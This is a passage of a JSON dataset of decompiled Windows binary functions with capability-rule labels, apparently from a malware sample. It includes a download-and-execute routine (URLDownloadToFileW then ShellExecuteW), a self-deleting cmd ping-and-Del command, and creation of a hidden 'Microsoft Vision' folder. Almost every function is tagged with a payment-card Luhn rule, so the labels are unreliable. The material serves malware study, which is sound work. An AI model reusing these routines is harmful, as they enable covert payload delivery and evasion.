        "decompiled_code": "\nvoid __cdecl fcn.000818a3(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.000859a9();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            piVar1 = var_8h;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                *piVar1 = 0;\n                piVar1 = piVar1 + 3;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                arg_8h_00 = (-8 - var_8h) + piVar1 + *in_ECX;\n                fcn.000831fd(arg_8h_00);\n                piVar2 = piVar2 + 1;\n                piVar1[-1] = *(arg_8h_00 + 4);\n                *piVar1 = *(arg_8h_00 + 8);\n                piVar1 = piVar1 + 3;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00081aa0();\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = in_ECX[2];\n    fcn.000831fd(&arg_8h);\n    var_8h[piVar1 * 3 + 1] = arg_ch;\n    var_8h[piVar1 * 3 + 2] = arg_10h;\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 583
    },
    "00081996": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00081996(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.000859a9();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1 = piVar1 + 3;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 184
    },
    "000819e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000819e3(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    \n    fcn.000856f9();\n    arg_8h_00 = arg_ch * 0xc + *in_ECX;\n    fcn.000833f3(arg_8h_00);\n    *(arg_8h + 4) = *(arg_8h_00 + 4);\n    *(arg_8h + 8) = *(arg_8h_00 + 8);\n    return arg_8h;\n}\n",
        "token_count": 145
    },
    "00081a1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00081a1e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.0008138f();\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 82
    },
    "00081a48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00081a48(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0x10 + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -4;\n        fcn.000858fb();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 126
    },
    "00081a75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00081a75(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0x18 + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -6;\n        fcn.000858fb();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 126
    },
    "00081aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00081aa0(int32_t param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(param_1 + -4);\n    puVar1 = iVar2 * 0xc + param_1;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        puVar1 = puVar1 + -3;\n        fcn.000858fb();\n        *puVar1 = 0;\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 125
    },
    "00081dfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081dfe(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t **in_ECX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    int32_t in_stack_00000008;\n    int32_t in_stack_0000000c;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = in_ECX[2];\n    if (piVar3 < in_ECX[1]) {\n        piVar2 = *in_ECX;\n    }\n    else {\n        piVar5 = (piVar3 + 1U) * in_ECX[3];\n        piVar2 = fcn.000859a9();\n        piVar3 = NULL;\n        if (piVar2 == NULL) {\n            piVar2 = NULL;\n        }\n        else {\n            *piVar2 = piVar5;\n            piVar2 = piVar2 + 1;\n        }\n        if (in_ECX[2] != NULL) {\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + piVar2;\n                puVar6 = *in_ECX + iVar4;\n                piVar3 = piVar3 + 1;\n                iVar4 = iVar4 + 0xc;\n                *puVar1 = *puVar6;\n                puVar1[1] = puVar6[1];\n                puVar1[2] = puVar6[2];\n            } while (piVar3 < in_ECX[2]);\n        }\n        piVar3 = in_ECX[2];\n        *in_ECX = piVar2;\n        in_ECX[1] = piVar5;\n    }\n    piVar2 = piVar2 + piVar3 * 3;\n    *piVar2 = arg_8h;\n    piVar2[1] = in_stack_00000008;\n    piVar2[2] = in_stack_0000000c;\n    in_ECX[2] = in_ECX[2] + 1;\n    return;\n}\n",
        "token_count": 483
    },
    "00081f0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081f0e(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **in_ECX;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (in_ECX[1] <= in_ECX[2]) {\n        piVar4 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar2 = fcn.000859a9();\n        if (piVar2 == NULL) {\n            piVar2 = NULL;\n        }\n        else {\n            *piVar2 = piVar4;\n            piVar2 = piVar2 + 1;\n            piVar1 = piVar2;\n            for (piVar3 = piVar4; piVar3 != NULL; piVar3 = piVar3 + -1) {\n                *piVar1 = 0;\n                piVar1[1] = 0;\n                piVar1[2] = 0;\n                piVar1 = piVar1 + 4;\n            }\n        }\n        piVar3 = NULL;\n        if (in_ECX[2] != NULL) {\n            var_4h = 0;\n            do {\n                fcn.0008201d(*in_ECX + var_4h);\n                piVar3 = piVar3 + 1;\n                var_4h = var_4h + 0x10;\n            } while (piVar3 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00081a1e();\n        }\n        *in_ECX = piVar2;\n        in_ECX[1] = piVar4;\n    }\n    fcn.0008201d(&arg_8h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.0008138f();\n    return;\n}\n",
        "token_count": 449
    },
    "00082053": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00082053(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = param_1[1];\n    piVar2 = fcn.000859a9();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        *piVar2 = piVar3;\n        piVar2 = piVar2 + 1;\n        piVar1 = piVar2;\n        for (; piVar3 != NULL; piVar3 = piVar3 + -1) {\n            *piVar1 = 0;\n            piVar1[1] = 0;\n            piVar1[2] = 0;\n            piVar1 = piVar1 + 4;\n        }\n    }\n    *param_1 = piVar2;\n    return;\n}\n",
        "token_count": 206
    },
    "000820a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000820a7(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    fcn.000856f9();\n    fcn.00081ed8(arg_ch * 0x10 + *in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 72
    },
    "00082100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00082100(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_ECX[1] <= in_ECX[2]) {\n        piVar2 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.000859a9();\n        if (piVar1 == NULL) {\n            piVar1 = NULL;\n        }\n        else {\n            *piVar1 = piVar2;\n            piVar1 = piVar1 + 1;\n            piVar4 = piVar2;\n            piVar3 = piVar1;\n            if (piVar2 != NULL) {\n                for (; piVar4 != NULL; piVar4 = piVar4 + -1) {\n                    *piVar3 = 0;\n                    piVar3 = piVar3 + 1;\n                }\n            }\n        }\n        piVar4 = NULL;\n        if (in_ECX[2] != NULL) {\n            do {\n                fcn.000831fd(*in_ECX + piVar4);\n                piVar4 = piVar4 + 1;\n            } while (piVar4 < in_ECX[2]);\n        }\n        piVar4 = *in_ECX;\n        if (piVar4 != NULL) {\n            iVar5 = piVar4[-1];\n            piVar4 = piVar4 + iVar5;\n            for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n                piVar4 = piVar4 + -1;\n                fcn.000858fb();\n                *piVar4 = 0;\n            }\n        }\n        *in_ECX = piVar1;\n        in_ECX[1] = piVar2;\n    }\n    fcn.000831fd(&arg_8h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 484
    },
    "000822e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000822e1(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    \n    fcn.000856f9();\n    fcn.0008e618(arg_ch * 0x30 + *in_ECX);\n    return arg_8h;\n}\n",
        "token_count": 72
    },
    "0008264b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "download URL",
            "receive data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008264b(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint lpFile;\n    \n    fcn.0008d51c();\n    uVar1 = fcn.0008326d();\n    fcn.00083230(0x92464);\n    fcn.000830fb(uVar1);\n    fcn.000858fb();\n    iVar3 = arg_8h + 4;\n    fcn.000833f3(iVar3);\n    uVar1 = fcn.000832e3(&arg_8h);\n    fcn.000830fb(uVar1);\n    fcn.000858fb();\n    arg_8h = 0;\n    fcn.000858fb();\n    uVar1 = lpFile;\n    fcn.000833f3(iVar3);\n    iVar3 = (*_sym.imp.urlmon.dll_URLDownloadToFileW)(0, arg_8h, uVar1, 0, 0);\n    fcn.000858fb();\n    if (iVar3 == 0) {\n        uVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x92468, lpFile, 0, 0, 5);\n        var_ch = 2;\n        if (0x20 < uVar2) {\n            var_ch = 0;\n        }\n    }\n    else {\n        var_ch = 1;\n    }\n    var_10h = 0x925a4;\n    fcn.00084a3d(&var_10h);\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 383
    },
    "000827d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.000827d9(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    uint lpCommandLine;\n    uint var_32dh;\n    uint lpFilename;\n    uint var_58h;\n    uint var_14h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    fcn.0008ea1c();\n    if (*(param_2 + 0x68) != 0) {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*0x967b4, 0);\n    }\n    if (*(param_2 + 0x50) != 0) {\n        fcn.0008eb4b(*(param_2 + 8), param_2 + 0x14, 0x20006, 0);\n        fcn.000833f3(param_2 + 0x54);\n        fcn.0008ea37(&var_4h);\n        fcn.000858fb();\n        fcn.0008ea99();\n    }\n    fcn.00081052(&var_58h, 0, 0x44);\n    var_14h = 0;\n    var_10h = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &lpFilename, 0x104);\n    fcn.0008102c(&lpCommandLine, \"cmd.exe /C ping 1.2.3.4 -n 2 -w 1000 > Nul & Del /f /q \", 0x37);\n    fcn.0008102c(&var_32dh, 0x944f8, 1);\n    arg_10h = fcn.000810d5(&lpFilename);\n    fcn.0008102c(&var_32dh + 1, &lpFilename, arg_10h);\n    iVar2 = fcn.000810d5(&lpFilename);\n    fcn.0008102c(&var_32dh + iVar2 + 1, 0x944f8, 2);\n    (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &lpCommandLine, 0, 0, 0, 0x8000000, 0, 0, &var_58h, &var_14h);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(var_10h);\n    (*pcVar1)(var_14h);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 630
    },
    "0008296e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008296e(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint arg_8h;\n    uint *arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    arg_8h = 0;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n    param_2 = param_2 + 4;\n    iVar1 = param_2;\n    uVar2 = extraout_ECX;\n    fcn.000833f3(param_2);\n    iVar1 = fcn.0008da33(iVar1);\n    if (iVar1 == 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)(uVar2);\n    }\n    else {\n        fcn.000833f3(param_2);\n        arg_8h_00 = &var_4h;\n        uVar2 = extraout_ECX_00;\n        fcn.000833f3(arg_8h_00);\n        fcn.00083718(arg_8h_00);\n        fcn.000858fb(arg_8h_00, uVar2);\n        fcn.00083701();\n    }\n    fcn.000833f3(param_2);\n    uVar2 = fcn.00083bc4(arg_8h, param_2);\n    fcn.00084a3d(uVar2);\n    fcn.00083bad();\n    return;\n}\n",
        "token_count": 359
    },
    "00082aa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00082aa1(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint var_24h;\n    int32_t var_10h;\n    \n    fcn.0008e80f();\n    arg_8h_00 = &var_10h;\n    fcn.000812ba(arg_8h_00);\n    arg_8h = fcn.000841eb(arg_8h_00);\n    fcn.00084a3d(arg_8h);\n    fcn.000841af();\n    if (var_10h != 0) {\n        for (iVar1 = *(var_10h + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n            fcn.000813b6();\n        }\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "00082aff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00082aff(uint param_1, int32_t param_2)\n\n{\n    uint arg_1ch;\n    uint arg_18h;\n    uint arg_14h;\n    uint uVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint noname_1;\n    uint arg_10h;\n    uint arg_20h;\n    uint arg_24h;\n    uint *noname_0;\n    uint lpPathName;\n    uint lpFilename;\n    uint var_34h;\n    uint var_ch;\n    uint var_8h;\n    \n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    var_ch = 0;\n    fcn.0008f5c8();\n    noname_0 = &var_8h;\n    var_8h = 0;\n    fcn.0008f2c7(noname_0, noname_0);\n    arg_24h = 0x92428;\n    fcn.000833ab(0x92428);\n    arg_20h = extraout_ECX;\n    fcn.0008d7a6();\n    arg_1ch = fcn.0008d780();\n    arg_18h = fcn.0008d724();\n    arg_14h = fcn.0008d56a();\n    arg_10h = 0xb4;\n    uVar1 = extraout_ECX_00;\n    noname_1 = extraout_ECX_00;\n    fcn.0008d7e0(&stack0xfffffc74);\n    uVar1 = fcn.00083e02(uVar1, noname_1, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, noname_0);\n    fcn.00084a3d(uVar1);\n    fcn.00083dd8();\n    if (*(param_2 + 0x34) != 0) {\n        fcn.00081052(&lpPathName, 0, 0x208);\n        (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &lpPathName);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpPathName, L\"\\\\Microsoft Vision\\\\\");\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(&lpPathName, 0);\n        fcn.00088431(param_1, 1);\n        var_8h = 0x94784;\n        fcn.00084a3d(&var_8h);\n    }\n    return;\n}\n",
        "token_count": 591
    },
    "00082c1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00082c1e(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00085955();\n    fcn.00085985(arg_10h);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    fcn.00082d5a(arg_8h_00, arg_10h);\n    fcn.00085944();\n    return arg_8h;\n}\n",
        "token_count": 127
    },
    "00082c65": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00082c65(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if (*(arg_8h + 4) != 0) {\n        uVar1 = fcn.00085955();\n        *in_ECX = uVar1;\n        fcn.00085985(*(arg_8h + 4));\n        in_ECX[1] = *(arg_8h + 4);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00082ca1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00082ca1(uint arg_8h)\n\n{\n    uint lpString2;\n    int32_t in_ECX;\n    \n    lpString2 = fcn.000859a9();\n    fcn.00085966(*(in_ECX + 4) + 2);\n    fcn.00085985(*(in_ECX + 4));\n    fcn.000833ab(lpString2);\n    return arg_8h;\n}\n",
        "token_count": 99
    },
    "00082cf2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00082cf2(uint arg_8h)\n\n{\n    uint lpString2;\n    int32_t in_ECX;\n    \n    lpString2 = fcn.000859a9();\n    fcn.00085966(*(in_ECX + 4) + 1);\n    fcn.00085985(*(in_ECX + 4));\n    fcn.00083185(lpString2);\n    return arg_8h;\n}\n",
        "token_count": 99
    },
    "00082d5a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00082d5a(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    uVar1 = fcn.0008591b();\n    *in_ECX = uVar1;\n    fcn.00085985(arg_ch);\n    in_ECX[1] = in_ECX[1] + arg_ch;\n    return;\n}\n",
        "token_count": 94
    },
    "00082e12": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00082e12(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    uVar1 = fcn.00085955();\n    *in_ECX = uVar1;\n    fcn.00085985(*(arg_8h + 4));\n    in_ECX[1] = *(arg_8h + 4);\n    return;\n}\n",
        "token_count": 93
    },
    "00082e63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00082e63(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_ECX;\n    uint var_4h;\n    \n    *arg_8h = 0;\n    iVar1 = fcn.00082e52();\n    if (0 < iVar1) {\n        iVar1 = fcn.00082e52(0, 0);\n        iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 2, *in_ECX, iVar1 + 2);\n        uVar2 = fcn.00085878();\n        fcn.00082e52();\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0xfde9, 0, *in_ECX, 0xffffffff, uVar2, iVar1 * 2);\n        uVar2 = fcn.000833ab(uVar2);\n        fcn.000831fd(uVar2);\n        fcn.000858fb();\n        fcn.000858fb();\n    }\n    return arg_8h;\n}\n",
        "token_count": 247
    },
    "00082f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00082f50(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.00082e52();\n    fcn.00082e52();\n    uVar1 = fcn.0008589c();\n    *in_ECX = uVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(uVar1, *arg_8h);\n    return;\n}\n",
        "token_count": 102
    },
    "00082f9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query environment variable"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00082f9a(uint param_1, uint *param_2)\n\n{\n    uint lpDst;\n    \n    fcn.00081052(&lpDst, 0, 0x400);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(*param_2, &lpDst, 0x1ff);\n    fcn.000833ab(&lpDst);\n    return param_1;\n}\n",
        "token_count": 96
    },
    "00083038": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00083038(uint arg_8h)\n\n{\n    uint ARG_0;\n    \n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, 0x92480, arg_8h);\n    fcn.000833ab(&ARG_0);\n    fcn.000830fb(&arg_8h);\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 89
    },
    "000830fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000830fb(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    \n    fcn.00083027();\n    fcn.00083027();\n    uVar1 = fcn.0008589c();\n    *in_ECX = uVar1;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(uVar1, *arg_8h);\n    return;\n}\n",
        "token_count": 99
    },
    "0008326d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0008326d(uint *param_1, int32_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint var_34h;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    *param_1 = 0;\n    var_8h = param_1;\n    var_4h = param_2;\n    arg_8h = fcn.000810ad(param_2);\n    fcn.00081052(arg_8h, 0, param_2);\n    puVar2 = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJK...\";\n    puVar4 = &var_34h;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar2;\n    uVar5 = 0;\n    uVar3 = var_4h - 1;\n    if (uVar3 != 0) {\n        do {\n            iVar1 = fcn.0008108f();\n            *(uVar5 + arg_8h) = *(&var_34h + iVar1 % 0x28);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar3);\n    }\n    *(arg_8h + uVar3) = 0;\n    fcn.00083085(arg_8h);\n    fcn.000810c1(arg_8h);\n    return var_8h;\n}\n",
        "token_count": 403
    },
    "0008359d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008359d(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.0008f56d(**arg_8h);\n    fcn.000831fd(arg_8h_00);\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 77
    },
    "000835d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000835d9(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.0008f56d(**arg_8h);\n    fcn.000831fd(arg_8h_00);\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 77
    },
    "00083643": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00083643(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = fcn.0008f56d(*(*arg_8h + 4));\n    fcn.000831fd(arg_8h_00);\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 106
    },
    "000836c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000836c5(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.0008f56d(**arg_8h);\n    fcn.000831fd(arg_8h_00);\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 77
    },
    "0008385b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008385b(uint *param_1)\n\n{\n    *param_1 = 0x92524;\n    if (param_1[3] != 0) {\n        fcn.00085944();\n    }\n    param_1[3] = 0;\n    return;\n}\n",
        "token_count": 69
    },
    "00083888": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00083888(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.0008f56d(**arg_8h);\n    arg_8h_00 = fcn.0008331a(&var_4h);\n    fcn.00082eeb(arg_8h_00);\n    fcn.000858fb();\n    fcn.000858fb();\n    return;\n}\n",
        "token_count": 106
    },
    "00083965": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
